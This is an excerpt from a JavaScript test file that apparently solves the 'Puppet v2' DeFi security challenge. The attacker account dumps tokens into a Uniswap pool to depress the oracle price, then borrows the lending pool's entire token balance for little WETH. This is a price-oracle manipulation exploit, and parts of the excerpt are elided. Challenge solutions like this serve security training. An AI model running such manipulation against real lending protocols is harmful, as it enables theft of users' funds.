...
describe('[Challenge] Puppet v2', function () {
  ...
  it('Exploit', async function () {
    ...
    const printPrice = async () => {
      const priceForAll = await this.lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
      console.log('Price to Swoop: ', priceForAll.toString())
    }

    const depositIntoUniPool = async (bnAmount) => {
      await this.token
        .connect(attacker)
        .approve(this.uniswapRouter.address, bnAmount)
    ...
    const borrowToken = async (bnEthAmount) => {
      await this.weth.connect(attacker).deposit({ value: bnEthAmount })
      await this.weth
        .connect(attacker)
        .approve(this.lendingPool.address, bnEthAmount)
      await this.lendingPool
        .connect(attacker)
        .borrow(POOL_INITIAL_TOKEN_BALANCE)
      // .borrow(POOL_INITIAL_TOKEN_BALANCE.div(2).toString())
    }

    const printAttackerBalances = async () => {
      ...
      const ethBalance = await attacker.getBalance()
    ...
    //  * Push down on price
    console.log('\n### First pushdown ###')
    await depositIntoUniPool(ATTACKER_INITIAL_TOKEN_BALANCE)
    await printAttackerBalances()
    await printPrice()

    //  * Price low enough for Swoop
    console.log('\n### Second pushdown ###')
    await borrowToken(ethers.utils.parseUnits('29800452997781696484', 'wei')) //amount from console log
    await printAttackerBalances()
  })
